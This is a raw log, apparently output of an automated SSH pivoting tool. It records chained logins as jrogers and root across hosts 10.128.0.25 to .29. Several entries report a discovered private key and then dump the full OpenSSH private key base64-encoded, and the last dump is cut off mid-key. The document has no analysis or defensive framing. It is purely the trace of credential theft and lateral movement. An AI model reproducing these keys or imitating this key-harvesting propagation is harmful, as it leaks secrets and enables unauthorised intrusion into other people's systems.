jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.27)\n[1704020289]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26\n[1704020289]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)\n[1704020289]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26: Discovered usable private key [3072 MD5:ce:66:2c:1c:cb:51:ae:5d:b6:57:78:52:fa:ad:85:8e jrogers@instance-4 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020289]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUFxR1UzdVhNWXRoVXV0QzJLbkRqOXR2MjEzcWxPR053d0ltY2gxajlqSjloMi95dlRFV0ZZCk1SMmIvTTdWQzJONlgzZDB5OGx0R1hKQXJsdlRINEswcmJMdGNMNVdCSy9KSS8yc1U0NjlSai9GOE40M1grS2UrQWlvOTkKNHdMVjJKUlg0c3daRDRsSFNBQ3JlT3E2WlF5R0dyU3o5MnRuNy9YQUpPSVVMOGJpTUsrMWZ4aFh6MmxZYXkxTWhYaFZONQpoeDlBRTl0V1pwd1VzYzJ2Kys5blRqSW5OeU95U0N6Ym55QWFKSy9seDVtaWhKUERsQkE1NTFDUzdQNE1TeU5xc1FtQzBwCnpJTjJNcW04RG1iUnJydVpBWWNFRytKNXVINWZtR2szY0dPZ3JlSlp0VXJIR0NGQjNkUmN1RGNqemVjWmNmUzFpOERrV0QKWlJGeXQrTjlwZU5vSXM2Nk9JL0VnTENWMkczcVB3SUJIcys4RVVFNmZUUmYvRXc0eHBLVm9QZDAvcjhEUy9Sak51UE1IVwpvSU53TjFtYnpHci8wbXFNemFjektHTFZldENFLzZ6MXZJb3pNM1VRRGU0NFVQNmo4aTdFaHFXM0xiUmdYQ01iQ2lpdXdrCjBXYkdtS2o5Q0RnZm51NUl5UUp3d0dwUUxMY0Nqd1ZCQ2d1dDNXaHBBQUFGaUxoU1JlMjRVa1h0QUFBQUIzTnphQzF5YzIKRUFBQUdCQUtobE43bHpHTFlWTHJRdGlwdzQvYmI5dGQ2cFRoamNNQ0puSWRZL1l5ZllkdjhyMHhGaFdERWRtL3pPMVF0agplbDkzZE12SmJSbHlRSzViMHgrQ3RLMnk3WEMrVmdTdnlTUDlyRk9PdlVZL3hmRGVOMS9pbnZnSXFQZmVNQzFkaVVWK0xNCkdRK0pSMGdBcTNqcXVtVU1oaHEwcy9kclorLzF3Q1RpRkMvRzRqQ3Z0WDhZVjg5cFdHc3RUSVY0VlRlWWNmUUJQYlZtYWMKRkxITnIvdnZaMDR5SnpjanNrZ3MyNThnR2lTdjVjZVpvb1NUdzVRUU9lZFFrdXorREVzamFyRUpndEtjeURkaktwdkE1bQowYTY3bVFHSEJCdmllYmgrWDVocE4zQmpvSzNpV2JWS3h4Z2hRZDNVWExnM0k4M25HWEgwdFl2QTVGZzJVUmNyZmpmYVhqCmFDTE91amlQeElDd2xkaHQ2ajhDQVI3UHZCRkJPbjAwWC94TU9NYVNsYUQzZFA2L0EwdjBZemJqekIxcUNEY0RkWm04eHEKLzlKcWpNMm5NeWhpMVhyUWhQK3M5YnlLTXpOMUVBM3VPRkQrby9JdXhJYWx0eTIwWUZ3akd3b29yc0pORm14cGlvL1FnNApINTd1U01rQ2NNQnFVQ3kzQW84RlFRb0xyZDFvYVFBQUFBTUJBQUVBQUFHQUNjZUhDdkFTT1ZEVm00VWhqWjBKcnZ6ZytRCk5nRTdXRjNobWJMM1FTOEJkMEliR0wybkNLeko5cGxhNzFWR244aTFyR242Y2MvT05UdWt4KzRFK1k2cFYva0pLZE1EeDkKTStmaGdDREVBVFptNm13ZFR5WThFUzkva0pXSXVybTU1UjFFd0NFSkxxWHRZYkh6U1NpcGZGbWZ0d2tDZmVxMkxjTzhnZApZQUR1MWVEK2Exa2drRjBQMDNtWC9oQlU4cHVaMG8vWDQ1Y0ZBVUs1ZEVaeDhxSXJKcThKclVHYmp4TURhUERoNWcrOHlDClVheTdLUGdnUkx5N0s2UTlWb2ZCN0UvM3dMR2RWbDJlQ2hnWDR2MlFzUU5qazNZdldZKzdORW5kT3VvU1JZd3luOFBLdzEKcUdPTmJMcTJyU1NsOG16b0xYeTVMcmovV25zTHU2YWZtcTYvOUpOaDBWamNDRkZCNEUzTUI2U1lkNUpSeUxxUEZaRHBPRgpsbG81bEovN0c2Sk9OaWFyanhaZTdobitpLzMvWTkwVVEyN3lpaUUxUlowV3A0L0lRSkZoSGRJejVNSVBFWnRobjk2ZzlyCjB3OFVKMTE5QldDcmlHWTlldG84K1VoRjZmNVlocys0N255a2ZwblFHQ2NWRXBRV1kvbEJobkxtMXE1ZGpJWXZMNUFBQUEKd0Z0TGdFc3lSVEFCa2QxZVA2cXMycG5oM2NWY2RUcTdSSWRwcFNGTmtMQUc1dE1sam9UajVNL1QxSjJMbFVJcXIzRFFJbQpxSFQ4KzVIN3V3N1BudEg2OHE1UXo2NmRqajF3ZVhjMVJ1MHhtc3JKc2M4NFJ0ZG9tSGtuUnp3MUpubis2eUtLbUdvVUhpCjJ0N0JOZHBBdC9HZElNMitES0RCVjVqbUREaUdHblJvdUVvSjBKb0VZeGtpTFFwL0xWNzhtMHU4MktwN212cW1rNmY4MDYKcEl1ME10cnpUME55ZFZ6QzQvRjZ0RkZ3WVIycmtucGRpMWU5d0NxUUpPZFQ2UDBnQUFBTUVBMTYvTUtiVlAxbnhlRC8yUQpxTGlkdjFqc2QrWVNPNThQQXRNM0c2QVJ3TEFrNktpSktFUHpWUUJtRDZzNVZsRi9mM2kwQWh1c2pMQnJGZjhDbTRtUmhRClpvM3dIN2Jabkl0dG1sT21VNERRVWhIZUU3RzdSQ2JIRUx3U2tybE5ocTdwYldyUk9nOUxmYVBPZkNNaEN1NzBmWTcwSWIKa3JPRytpay83b1ByQkc1dk0rNmw5SkorNWpLMlM5Sm9hb25GdGFJY1FYeXBuOUpFbTZramVZcjJVZzdnNkV3WjMrSzM0RQpOdHN5OUczNDVsdXJQNjBZTldOK2VrZkhWQnlNdURBQUFBd1FESDNwNkpFSCtDZCt4eW1SaDhVTlo3RmFLeXNNVmRMdDRNCllIVVZKVTJPQ2lIRUhoT0xXdzR2R3dLUWZsZDdNME1mTlVTRDE5SmZkMEVMTFNHUmhEeTdKaGpkYUNTMHdtZWlXYUc3OFYKcDhJSHFJYXlmd1BJWCtiY0t2SEErTysyM1pzckJRaUxKRHZES1VmYTA3bjV5dnNFMnFaZEdtaFAxQmcvanBKSFpHek9ESwozL0FxYlkzVWczS3RMM3VnaFhmSGEzSm5Iam5lUytYZ0tyOEtJQUFyTTFmUFFQcS9QVHZMU2Rzb2VjTzB2eEcxK1Aza2F3CkxyRFdFa2k2VUFuS01BQUFBU2FuSnZaMlZ5YzBCcGJuTjBZVzVqWlMwMEFRPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020289]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26: EXTERNAL_MSG: INFO: Beginning with 6 dests and 1 keys\n[1704020290]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29\n[1704020290]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020291]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.29\n[1704020291]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020291]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.28\n[1704020291]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020291]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@127.0.0.1\n[1704020291]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020292]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.26\n[1704020292]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.26)\n[1704020292]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.29\n[1704020292]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020293]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.28\n[1704020293]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020293]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@127.0.0.1\n[1704020293]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020293]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28\n[1704020293]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020294]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n[1704020294]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020294]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n[1704020294]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020294]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26\n[1704020294]  jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020295]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26: Discovered usable private key [3072 MD5:ce:66:2c:1c:cb:51:ae:5d:b6:57:78:52:fa:ad:85:8e jrogers@instance-4 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020295]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUFxR1UzdVhNWXRoVXV0QzJLbkRqOXR2MjEzcWxPR053d0ltY2gxajlqSjloMi95dlRFV0ZZCk1SMmIvTTdWQzJONlgzZDB5OGx0R1hKQXJsdlRINEswcmJMdGNMNVdCSy9KSS8yc1U0NjlSai9GOE40M1grS2UrQWlvOTkKNHdMVjJKUlg0c3daRDRsSFNBQ3JlT3E2WlF5R0dyU3o5MnRuNy9YQUpPSVVMOGJpTUsrMWZ4aFh6MmxZYXkxTWhYaFZONQpoeDlBRTl0V1pwd1VzYzJ2Kys5blRqSW5OeU95U0N6Ym55QWFKSy9seDVtaWhKUERsQkE1NTFDUzdQNE1TeU5xc1FtQzBwCnpJTjJNcW04RG1iUnJydVpBWWNFRytKNXVINWZtR2szY0dPZ3JlSlp0VXJIR0NGQjNkUmN1RGNqemVjWmNmUzFpOERrV0QKWlJGeXQrTjlwZU5vSXM2Nk9JL0VnTENWMkczcVB3SUJIcys4RVVFNmZUUmYvRXc0eHBLVm9QZDAvcjhEUy9Sak51UE1IVwpvSU53TjFtYnpHci8wbXFNemFjektHTFZldENFLzZ6MXZJb3pNM1VRRGU0NFVQNmo4aTdFaHFXM0xiUmdYQ01iQ2lpdXdrCjBXYkdtS2o5Q0RnZm51NUl5UUp3d0dwUUxMY0Nqd1ZCQ2d1dDNXaHBBQUFGaUxoU1JlMjRVa1h0QUFBQUIzTnphQzF5YzIKRUFBQUdCQUtobE43bHpHTFlWTHJRdGlwdzQvYmI5dGQ2cFRoamNNQ0puSWRZL1l5ZllkdjhyMHhGaFdERWRtL3pPMVF0agplbDkzZE12SmJSbHlRSzViMHgrQ3RLMnk3WEMrVmdTdnlTUDlyRk9PdlVZL3hmRGVOMS9pbnZnSXFQZmVNQzFkaVVWK0xNCkdRK0pSMGdBcTNqcXVtVU1oaHEwcy9kclorLzF3Q1RpRkMvRzRqQ3Z0WDhZVjg5cFdHc3RUSVY0VlRlWWNmUUJQYlZtYWMKRkxITnIvdnZaMDR5SnpjanNrZ3MyNThnR2lTdjVjZVpvb1NUdzVRUU9lZFFrdXorREVzamFyRUpndEtjeURkaktwdkE1bQowYTY3bVFHSEJCdmllYmgrWDVocE4zQmpvSzNpV2JWS3h4Z2hRZDNVWExnM0k4M25HWEgwdFl2QTVGZzJVUmNyZmpmYVhqCmFDTE91amlQeElDd2xkaHQ2ajhDQVI3UHZCRkJPbjAwWC94TU9NYVNsYUQzZFA2L0EwdjBZemJqekIxcUNEY0RkWm04eHEKLzlKcWpNMm5NeWhpMVhyUWhQK3M5YnlLTXpOMUVBM3VPRkQrby9JdXhJYWx0eTIwWUZ3akd3b29yc0pORm14cGlvL1FnNApINTd1U01rQ2NNQnFVQ3kzQW84RlFRb0xyZDFvYVFBQUFBTUJBQUVBQUFHQUNjZUhDdkFTT1ZEVm00VWhqWjBKcnZ6ZytRCk5nRTdXRjNobWJMM1FTOEJkMEliR0wybkNLeko5cGxhNzFWR244aTFyR242Y2MvT05UdWt4KzRFK1k2cFYva0pLZE1EeDkKTStmaGdDREVBVFptNm13ZFR5WThFUzkva0pXSXVybTU1UjFFd0NFSkxxWHRZYkh6U1NpcGZGbWZ0d2tDZmVxMkxjTzhnZApZQUR1MWVEK2Exa2drRjBQMDNtWC9oQlU4cHVaMG8vWDQ1Y0ZBVUs1ZEVaeDhxSXJKcThKclVHYmp4TURhUERoNWcrOHlDClVheTdLUGdnUkx5N0s2UTlWb2ZCN0UvM3dMR2RWbDJlQ2hnWDR2MlFzUU5qazNZdldZKzdORW5kT3VvU1JZd3luOFBLdzEKcUdPTmJMcTJyU1NsOG16b0xYeTVMcmovV25zTHU2YWZtcTYvOUpOaDBWamNDRkZCNEUzTUI2U1lkNUpSeUxxUEZaRHBPRgpsbG81bEovN0c2Sk9OaWFyanhaZTdobitpLzMvWTkwVVEyN3lpaUUxUlowV3A0L0lRSkZoSGRJejVNSVBFWnRobjk2ZzlyCjB3OFVKMTE5QldDcmlHWTlldG84K1VoRjZmNVlocys0N255a2ZwblFHQ2NWRXBRV1kvbEJobkxtMXE1ZGpJWXZMNUFBQUEKd0Z0TGdFc3lSVEFCa2QxZVA2cXMycG5oM2NWY2RUcTdSSWRwcFNGTmtMQUc1dE1sam9UajVNL1QxSjJMbFVJcXIzRFFJbQpxSFQ4KzVIN3V3N1BudEg2OHE1UXo2NmRqajF3ZVhjMVJ1MHhtc3JKc2M4NFJ0ZG9tSGtuUnp3MUpubis2eUtLbUdvVUhpCjJ0N0JOZHBBdC9HZElNMitES0RCVjVqbUREaUdHblJvdUVvSjBKb0VZeGtpTFFwL0xWNzhtMHU4MktwN212cW1rNmY4MDYKcEl1ME10cnpUME55ZFZ6QzQvRjZ0RkZ3WVIycmtucGRpMWU5d0NxUUpPZFQ2UDBnQUFBTUVBMTYvTUtiVlAxbnhlRC8yUQpxTGlkdjFqc2QrWVNPNThQQXRNM0c2QVJ3TEFrNktpSktFUHpWUUJtRDZzNVZsRi9mM2kwQWh1c2pMQnJGZjhDbTRtUmhRClpvM3dIN2Jabkl0dG1sT21VNERRVWhIZUU3RzdSQ2JIRUx3U2tybE5ocTdwYldyUk9nOUxmYVBPZkNNaEN1NzBmWTcwSWIKa3JPRytpay83b1ByQkc1dk0rNmw5SkorNWpLMlM5Sm9hb25GdGFJY1FYeXBuOUpFbTZramVZcjJVZzdnNkV3WjMrSzM0RQpOdHN5OUczNDVsdXJQNjBZTldOK2VrZkhWQnlNdURBQUFBd1FESDNwNkpFSCtDZCt4eW1SaDhVTlo3RmFLeXNNVmRMdDRNCllIVVZKVTJPQ2lIRUhoT0xXdzR2R3dLUWZsZDdNME1mTlVTRDE5SmZkMEVMTFNHUmhEeTdKaGpkYUNTMHdtZWlXYUc3OFYKcDhJSHFJYXlmd1BJWCtiY0t2SEErTysyM1pzckJRaUxKRHZES1VmYTA3bjV5dnNFMnFaZEdtaFAxQmcvanBKSFpHek9ESwozL0FxYlkzVWczS3RMM3VnaFhmSGEzSm5Iam5lUytYZ0tyOEtJQUFyTTFmUFFQcS9QVHZMU2Rzb2VjTzB2eEcxK1Aza2F3CkxyRFdFa2k2VUFuS01BQUFBU2FuSnZaMlZ5YzBCcGJuTjBZVzVqWlMwMEFRPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020295]  jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26: EXTERNAL_MSG: INFO: Beginning with 12 dests and 1 keys\n[1704020296]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n[1704020296]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020296]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n[1704020296]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020297]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26\n[1704020297]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020297]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29\n[1704020297]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020298]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29: Discovered usable private key [3072 MD5:a5:d8:9d:c3:32:08:3f:72:b8:57:05:f8:f7:69:63:46 jrogers@instance-7 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020298]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF2ZUxNOFdvZkYzZXVaSVZiM3dNMEVTQktQaFNQYkRqNkZEUGdEc2tSUHNZc1g2SVg2b1dpCjc5dUtKL3B0ek1TZjBjRkFyaWxLK01WbjVLOE9ndENhK2UyWlkxUEwxZUQ2VzluRzhQcThYTUVybGtUekVNTjUwRUx3T1IKdmRMSW10SVpOelZKQTVLTjN6azNKY05xVEo2MHk2dnRReEV3VjcxVGVNTUdDTTAwaHBUYXZnR0ZmTnRDVjBRcWM3aWtwdApqd1ZFTWJJdGJiM2szZXpUakRVUEc4Ym5qbDd5cC9VNG1CaWFxTDdBUENjOVdWV0hTYUpEcHE3VXpJdTNwRWVWMFcrYlhVCnp3eFJ0bXRCNStxbnRUcjdOajlUaERZaTh0bVdqdnFISWY4QnNaMkpnLzNrQWRuT1JFSDFxRVZnejQ0RFNHWWxsSDdGK3kKbEtVa3VlbXFTdkFRQ0pET051d1JHaTFDb0lPRGtiR0pCSFhRbW12MXpYQkRtZmdFQ2kyOHFjQkU5UFRXeXN2L3lLUWJLeApycmZzVUQ2cUIrR3c5RUU3NW5udXdCMENEUzRuZld1ZEVTc2prVXZjcmZnd3BEN3lYOFhIQ0JKUmozK0NGbm5yYy9qN0c0CkZtR0lTVUt4ZmR3dlBMbmFKWUtVdnArYzhwTkcwK3l4VVVMcm1VT2ZBQUFGaUlHUVNVV0JrRWxGQUFBQUIzTnphQzF5YzIKRUFBQUdCQUwzaXpQRnFIeGQzcm1TRlc5OEROQkVnU2o0VWoydzQraFF6NEE3SkVUN0dMRitpRitxRm91L2JpaWY2YmN6RQpuOUhCUUs0cFN2akZaK1N2RG9MUW12bnRtV05UeTlYZytsdlp4dkQ2dkZ6Qks1WkU4eEREZWRCQzhEa2IzU3lKclNHVGMxClNRT1NqZDg1TnlYRGFreWV0TXVyN1VNUk1GZTlVM2pEQmdqTk5JYVUycjRCaFh6YlFsZEVLbk80cEtiWThGUkRHeUxXMjkKNU4zczA0dzFEeHZHNTQ1ZThxZjFPSmdZbXFpK3dEd25QVmxWaDBtaVE2YXUxTXlMdDZSSGxkRnZtMTFNOE1VYlpyUWVmcQpwN1U2K3pZL1U0UTJJdkxabG83Nmh5SC9BYkdkaVlQOTVBSFp6a1JCOWFoRllNK09BMGhtSlpSK3hmc3BTbEpMbnBxa3J3CkVBaVF6amJzRVJvdFFxQ0RnNUd4aVFSMTBKcHI5YzF3UTVuNEJBb3R2S25BUlBUMDFzckwvOGlrR3lzYTYzN0ZBK3FnZmgKc1BSQk8rWjU3c0FkQWcwdUozMXJuUkVySTVGTDNLMzRNS1ErOGwvRnh3Z1NVWTkvZ2haNTYzUDQreHVCWmhpRWxDc1gzYwpMenk1MmlXQ2xMNmZuUEtUUnRQc3NWRkM2NWxEbndBQUFBTUJBQUVBQUFHQWVyUksxMTVLUlRIem9jV0R2ck1sUEVQdmRmCnAzUytudHdJeGRKM0RMRWhPaHJSTGovWXJwNWJHcXIzYm02VUhPUFE5eXFwaklkOFdwQTJBVU1uaDNEVFo2dm5MeDczMzQKaXM1Si9vTW9vWSs2aU5wNWI4WEJ1OURseHlHNFpRVjZ1WTI5STFJbmZiOGZuWkp6QUdTd2pyc0Ftandva2pBaSszOXZ1Zgp0S1JXWXZsaCtSS21uaTVaeW1ha1FDOTdSczQ5VDFZbC9QZDNFVXFreFZ6KzZobXNPSDhycHNlQmpBdjVoMnFNRExISlFHCjB1bXdDT2N3YkUvaDkyUDZBZEMzWkthQ2ZJV3piaHFHM2ZpY3dpMU5DYm1ZR2tER0plenNkRFZDUmwxajNxQkV5UnJHdE8KbWpRRytUb3p2Vi9GK1hxNnUzVkltQTFLaEYreHZBMk1WSGowQ3RITFdTQTBNN2RrbGYrdEUvUDZRWEl2OG5UQktHUzErQQpONlcwS1B6RWhaQk9SVlYwb0dLOU15NkVSbGxENGNqenZoTVhDRDg1blY4NEY0ZGMvb251RGFKNGVsb05ONkZ1aWRsUlhLClR4dzhXTVVYRjE3MGVpRlJ3bi9qVnY3bjNsYVptUUlQSnVBYXliMUF0ZkdjZzczT3VJd2